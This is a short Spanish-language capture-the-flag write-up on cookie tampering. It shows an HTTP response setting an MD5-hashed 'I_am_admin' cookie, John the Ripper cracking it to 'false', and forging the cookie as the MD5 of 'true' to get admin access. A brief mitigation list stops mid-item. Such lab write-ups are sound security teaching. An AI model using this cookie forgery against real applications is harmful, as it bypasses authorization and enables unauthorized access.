# Cookie Tampering
### A07:2021 – Identification and Authentication Failures

Para la gestión de roles en una aplicación web, es habitual el uso de tokens o cookies para identificar el rol de un usuario.


## Ataque

En la parte inicial de reconocimiento, hemos observado que al hacer una petición al servidor, éste nos retorna una cabecera `Set-Cookie` con un 
formato interesante.

```bash

HTTP/1.1 200 OK
Server: nginx/1.4.6 (Ubuntu)
Date: Fri, 13 Jun 2025 15:16:20 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Fri, 13-Jun-2025 16:16:20 GMT; Max-Age=3600

```

El id de la cookie nos da a entender que es un tipo de control de roles que autentifica al usuario como administrador, y como valor tenemos una serie de caracteres sospechosamente parecidos a un hash MD5.

Nos guardamos la credencial y lanzamos un john:
```bash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
false            (I_am_admin)     
1g 0:00:00:00 DONE (2025-06-13 15:38) 2.222g/s 2122Kp/s 2122Kc/s 2122KC/s fame4eva..fahimi
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Vemos que el valor hasheado corresponde a **false**. Si probamos a poner como valor a la cookie **b326b5062b2f0e69046810717534cb09**, o true hasheado con md5, y hacemos una petición a la aplicación, nos devuelve la flag.

```bash
echo -n true | md5sum
```

## Mitigación
- No usar MD5 para hashear absolutamente nada relacionado con credenciales.
- Uso

## Referencias

- [OWASP: Testing for cookie attributes](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)